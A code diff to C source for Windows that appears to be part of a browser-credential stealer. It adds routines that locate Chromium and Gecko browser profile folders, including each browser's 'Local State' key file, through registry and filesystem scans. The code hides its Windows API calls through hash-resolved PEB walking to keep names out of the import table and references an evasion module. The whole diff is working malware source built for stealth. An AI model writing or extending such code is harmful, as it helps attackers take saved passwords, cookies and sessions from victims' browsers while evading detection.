@@ -7,6 +7,9 @@
 #include "config.h"
 #include "file_utils.h"
 #include <string.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <windows.h>
 
 /* ── Process name mapping ─────────────────────────────────────── */
 /* Each entry maps to the browser's actual executable stem (no .exe).
@@ -169,11 +172,7 @@ static void init_browsers(void) {
     initialized = 1;
 }
 
-const BrowserPath *get_chromium_browsers(size_t *count) {
-    init_browsers();
-    *count = 58;
-    return browsers;
-}
+/* ── Merged discovery buffers ─────────────────────────────────── */
 
 /* Gecko browsers — process_name mapped to actual exe stems */
 static const BrowserPath gecko_browsers[] = {
@@ -189,9 +188,302 @@ static const BrowserPath gecko_browsers[] = {
     {"Floorp",     "Floorp\\Profiles",              1, "floorp"},
 };
 
+#define MAX_MERGED_BROWSERS 128
+
+static BrowserPath merged_chromium[MAX_MERGED_BROWSERS];
+static size_t merged_chromium_count = 0;
+static int chromium_merged = 0;
+
+static BrowserPath merged_gecko[MAX_MERGED_BROWSERS];
+static size_t merged_gecko_count = 0;
+static int gecko_merged = 0;
+
+/*
+ * get_chromium_browsers — merged discovery API.
+ * 1. Registry-based scan (App Paths)
+ * 2. Filesystem scan (%LOCALAPPDATA%, %APPDATA%, depth 2)
+ * 3. Static 58-entry fallback table
+ * Deduplicates by case-insensitive path_suffix comparison.
+ */
+const BrowserPath *get_chromium_browsers(size_t *count) {
+    if (!chromium_merged) {
+        init_browsers();
+        merged_chromium_count = 0;
+
+        /* 1. Registry discovery */
+        discover_chromium_browsers_registry(merged_chromium,
+                                            MAX_MERGED_BROWSERS,
+                                            &merged_chromium_count);
+
+        /* 2. Filesystem discovery (dedup on insert) */
+        size_t fs_count = 0;
+        BrowserPath fs_buf[64];
+        discover_chromium_browsers_fs(fs_buf, 64, &fs_count);
+        for (size_t i = 0; i < fs_count && merged_chromium_count < MAX_MERGED_BROWSERS; i++) {
+            if (!bp_is_dup(merged_chromium, merged_chromium_count,
+                           fs_buf[i].path_suffix, fs_buf[i].use_roaming)) {
+                merged_chromium[merged_chromium_count++] = fs_buf[i];
+            }
+        }
+
+        /* 3. Static fallback (dedup on insert) */
+        for (int i = 0; i < 58 && merged_chromium_count < MAX_MERGED_BROWSERS; i++) {
+            if (!bp_is_dup(merged_chromium, merged_chromium_count,
+                           browsers[i].path_suffix, browsers[i].use_roaming)) {
+                merged_chromium[merged_chromium_count++] = browsers[i];
+            }
+        }
+
+        chromium_merged = 1;
+    }
+
+    *count = merged_chromium_count;
+    return merged_chromium;
+}
+
+/*
+ * get_gecko_browsers — merged discovery API.
+ * 1. Filesystem scan (%APPDATA%, depth 2)
+ * 2. Static 10-entry fallback table
+ */
 const BrowserPath *get_gecko_browsers(size_t *count) {
-    *count = 10;
-    return gecko_browsers;
+    if (!gecko_merged) {
+        merged_gecko_count = 0;
+
+        /* 1. Filesystem discovery */
+        discover_gecko_browsers_fs(merged_gecko, MAX_MERGED_BROWSERS,
+                                   &merged_gecko_count);
+
+        /* 2. Static fallback (dedup on insert) */
+        for (size_t i = 0; i < 10 && merged_gecko_count < MAX_MERGED_BROWSERS; i++) {
+            if (!bp_is_dup(merged_gecko, merged_gecko_count,
+                           gecko_browsers[i].path_suffix, gecko_browsers[i].use_roaming)) {
+                merged_gecko[merged_gecko_count++] = gecko_browsers[i];
+            }
+        }
+
+        gecko_merged = 1;
+    }
+
+    *count = merged_gecko_count;
+    return merged_gecko;
+}
+
+/* ════════════════════════════════════════════════════════════════
+ *  Dynamic FS-based Chromium browser discovery
+ *  Scans %LOCALAPPDATA% and %APPDATA% recursively (depth ≤2)
+ *  for directories containing a "Local State" file.
+ *  Uses PEB-walk hash-resolved FindFirstFileW/FindNextFileW.
+ * ════════════════════════════════════════════════════════════════ */
+
+/* Resolved Win32 API signatures */
+typedef DWORD  (*fn_genvw)(const WCHAR *, WCHAR *, DWORD);
+typedef HANDLE (*fn_fffw)(const WCHAR *, WIN32_FIND_DATAW *);
+typedef BOOL   (*fn_ffnw)(HANDLE, WIN32_FIND_DATAW *);
+typedef BOOL   (*fn_fcl)(HANDLE);
+
+/* ── Small helpers ────────────────────────────────────────── */
+
+static int bp_strieq(const char *a, const char *b)
+{
+    while (*a && *b) {
+        char ca = *a, cb = *b;
+        if (ca >= 'A' && ca <= 'Z') ca += 32;
+        if (cb >= 'A' && cb <= 'Z') cb += 32;
+        if (ca != cb) return 0;
+        a++; b++;
+    }
+    return *a == *b;
+}
+
+static int bp_is_dup(const BrowserPath *out, size_t n,
+                     const char *path, int roaming)
+{
+    for (size_t i = 0; i < n; i++)
+        if (out[i].use_roaming == roaming && bp_strieq(out[i].path_suffix, path))
+            return 1;
+    return 0;
+}
+
+/*
+ * Derive display name from path suffix.
+ *   "Google\\Chrome\\User Data"                → "Chrome"
+ *   "BraveSoftware\\Brave-Browser\\User Data"   → "Brave-Browser"
+ *   "Vivaldi\\User Data"                       → "Vivaldi"
+ *   "Opera Software\\Opera Stable"              → "Opera Stable"
+ */
+static void bp_derive_name(char *dst, size_t cap, const char *path)
+{
+    const char *s1 = NULL, *s2 = NULL;
+    for (const char *p = path; *p; p++)
+        if (*p == '\\') { s1 = s2; s2 = p; }
+
+    const char *last = s2 ? s2 + 1 : path;
+
+    if (strcmp(last, "User Data") == 0) {
+        if (s1) {
+            /* "Google\\Chrome\\User Data" → copy between s1+1 and s2 */
+            const char *start = s1 + 1;
+            size_t len = (size_t)(s2 - start);
+            if (len >= cap) len = cap - 1;
+            memcpy(dst, start, len);
+            dst[len] = '\0';
+        } else if (s2) {
+            /* "Vivaldi\\User Data" → copy from start to s2 */
+            size_t len = (size_t)(s2 - path);
+            if (len >= cap) len = cap - 1;
+            memcpy(dst, path, len);
+            dst[len] = '\0';
+        } else {
+            if (cap > 1) { dst[0] = '?'; dst[1] = '\0'; }
+        }
+    } else {
+        size_t len = strlen(last);
+        if (len >= cap) len = cap - 1;
+        memcpy(dst, last, len);
+        dst[len] = '\0';
+    }
+}
+
+/* Wide-string helpers (stack buffers, no alloc) */
+static int bp_wlen(const WCHAR *w)
+{
+    int n = 0; while (w[n]) n++; return n;
+}
+
+static void bp_wappend(WCHAR *dst, int cap, const WCHAR *src)
+{
+    int pos = bp_wlen(dst);
+    for (int j = 0; src[j] && pos < cap - 1; j++)
+        dst[pos++] = src[j];
+    dst[pos] = 0;
+}
+
+static void bp_wtoa(const WCHAR *w, char *a, size_t cap)
+{
+    size_t i = 0;
+    while (w[i] && i < cap - 1) { a[i] = (w[i] < 128) ? (char)w[i] : '?'; i++; }
+    a[i] = '\0';
+}
+
+/* ── Recursive directory scanner ──────────────────────────── */
+
+static void bp_fs_scan(
+    WCHAR *dir_w, char *dir_n,
+    int depth, int max_depth, int roaming,
+    BrowserPath *out, size_t cap, size_t *cnt,
+    fn_fffw pFF, fn_ffnw pFN, fn_fcl pFC)
+{
+    if (depth > max_depth || *cnt >= cap) return;
+
+    int    wlen = bp_wlen(dir_w);
+    size_t nlen = strlen(dir_n);
+
+    /* 1. Probe: does dir\\Local State exist? */
+    bp_wappend(dir_w, MAX_PATH, L"\\Local State");
+
+    WIN32_FIND_DATAW fd;
+    HANDLE h = pFF(dir_w, &fd);
+    dir_w[wlen] = 0;                         /* restore */
+
+    if (h != INVALID_HANDLE_VALUE) {
+        pFC(h);
+        if (!bp_is_dup(out, *cnt, dir_n, roaming) && *cnt < cap) {
+            char name[64];
+            bp_derive_name(name, sizeof(name), dir_n);
+            char *pc = (char *)malloc(nlen + 1);
+            char *nc = (char *)malloc(strlen(name) + 1);
+            if (pc && nc) {
+                memcpy(pc, dir_n, nlen + 1);
+                strcpy(nc, name);
+                out[*cnt].name        = nc;
+                out[*cnt].path_suffix = pc;
+                out[*cnt].use_roaming = roaming;
+                (*cnt)++;
+            } else {
+                free(pc);
+                free(nc);
+            }
+        }
+        return;                              /* leaf — don't recurse deeper */
+    }
+
+    /* 2. Enumerate subdirectories */
+    bp_wappend(dir_w, MAX_PATH, L"\\*");
+    h = pFF(dir_w, &fd);
+    dir_w[wlen] = 0;                         /* restore */
+    if (h == INVALID_HANDLE_VALUE) return;
+
+    do {
+        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
+        if (fd.cFileName[0] == L'.') {
+            if (fd.cFileName[1] == 0) continue;
+            if (fd.cFileName[1] == L'.' && fd.cFileName[2] == 0) continue;
+        }
+
+        /* Build child wide path */
+        bp_wappend(dir_w, MAX_PATH, L"\\");
+        bp_wappend(dir_w, MAX_PATH, fd.cFileName);
+
+        /* Build child narrow path */
+        size_t pos = nlen;
+        if (pos < MAX_PATH - 1) dir_n[pos++] = '\\';
+        for (int wi = 0; fd.cFileName[wi] && pos < MAX_PATH - 1; wi++)
+            dir_n[pos++] = (fd.cFileName[wi] < 128) ? (char)fd.cFileName[wi] : '?';
+        dir_n[pos] = '\0';
+
+        bp_fs_scan(dir_w, dir_n, depth + 1, max_depth, roaming,
+                   out, cap, cnt, pFF, pFN, pFC);
+
+        /* Restore buffers for next iteration */
+        dir_w[wlen] = 0;
+        dir_n[nlen] = '\0';
+    } while (pFN(h, &fd) && *cnt < cap);
+
+    pFC(h);
+}
+
+/* ── Public entry point ───────────────────────────────────── */
+
+int discover_chromium_browsers_fs(BrowserPath *out, size_t max_out, size_t *count)
+{
+    if (!out || !max_out) return -1;
+    *count = 0;
+
+    /* Resolve kernel32 via PEB walk */
+    void *k32 = mirage_get_module_by_hash(
+        mirage_encrypted_hash_module("kernel32.dll"));
+    if (!k32) return -1;
+
+    /* Resolve needed functions by hash (no plaintext names in IAT) */
+    fn_genvw pGetEnv = (fn_genvw)mirage_get_function_by_hash(
+        k32, mirage_encrypted_hash_func("GetEnvironmentVariableW"));
+    fn_fffw pFF = (fn_fffw)mirage_get_function_by_hash(
+        k32, mirage_encrypted_hash_func("FindFirstFileW"));
+    fn_ffnw pFN = (fn_ffnw)mirage_get_function_by_hash(
+        k32, mirage_encrypted_hash_func("FindNextFileW"));
+    fn_fcl  pFC = (fn_fcl)mirage_get_function_by_hash(
+        k32, mirage_encrypted_hash_func("FindClose"));
+    if (!pGetEnv || !pFF || !pFN || !pFC) return -1;
+
+    WCHAR base_w[MAX_PATH];
+    char  base_n[MAX_PATH];
+
+    /* Scan %LOCALAPPDATA% (roaming = 0) */
+    if (pGetEnv(L"LOCALAPPDATA", base_w, MAX_PATH) > 0) {
+        bp_wtoa(base_w, base_n, MAX_PATH);
+        bp_fs_scan(base_w, base_n, 0, 2, 0,
+                   out, max_out, count, pFF, pFN, pFC);
+    }
+
+    /* Scan %APPDATA% (roaming = 1) */
+    if (pGetEnv(L"APPDATA", base_w, MAX_PATH) > 0) {
+        bp_wtoa(base_w, base_n, MAX_PATH);
+        bp_fs_scan(base_w, base_n, 0, 2, 1,
+                   out, max_out, count, pFF, pFN, pFC);
+    }
+
+    return 0;
 }
 
 /* ════════════════════════════════════════════════════════════════ *
@@ -392,13 +684,17 @@ int discover_gecko_browsers_fs(BrowserPath *out, size_t max_out, size_t *count)
 
 /* ── UNICODE_STRING helper (same as evasion.c) ──────────────── */
 static void bp_init_unicode_string(const char *s, size_t len,
-                                   UNICODE_STRING *us, WCHAR *buf)
+                                   UNICODE_STRING *us, WCHAR *buf,
+                                   size_t buf_count)
 {
-    memset(buf, 0, 512 * sizeof(WCHAR));
-    for (size_t i = 0; i < len; i++)
+    size_t cap = buf_count < len + 1 ? buf_count : len + 1;
+    for (size_t i = 0; i < cap; i++)
+        buf[i] = 0;
+    size_t n = len < buf_count ? len : buf_count;
+    for (size_t i = 0; i < n; i++)
         buf[i] = (WCHAR)(unsigned char)s[i];
-    us->Length        = (USHORT)(len * sizeof(WCHAR));
-    us->MaximumLength = (USHORT)((len + 1) * sizeof(WCHAR));
+    us->Length        = (USHORT)(n * sizeof(WCHAR));
+    us->MaximumLength = (USHORT)(cap * sizeof(WCHAR));
     us->Buffer        = buf;
 }
 
@@ -462,7 +758,7 @@ int discover_chromium_browsers_registry(BrowserPath *out,
 
     WCHAR us_buf[512];
     UNICODE_STRING us;
-    bp_init_unicode_string(reg_path, strlen(reg_path), &us, us_buf);
+    bp_init_unicode_string(reg_path, strlen(reg_path), &us, us_buf, 512);
 
     /* ── Scan both native and WOW64 views ────────────────────── */
     ULONG views[] = {
@@ -519,7 +815,7 @@ int discover_chromium_browsers_registry(BrowserPath *out,
             WCHAR subkey_buf[256];
             UNICODE_STRING subkey_us;
             bp_init_unicode_string(subkey_name, name_len,
-                                   &subkey_us, subkey_buf);
+                                   &subkey_us, subkey_buf, 256);
 
             OBJECT_ATTRIBUTES sub_oa;
             memset(&sub_oa, 0, sizeof(sub_oa));
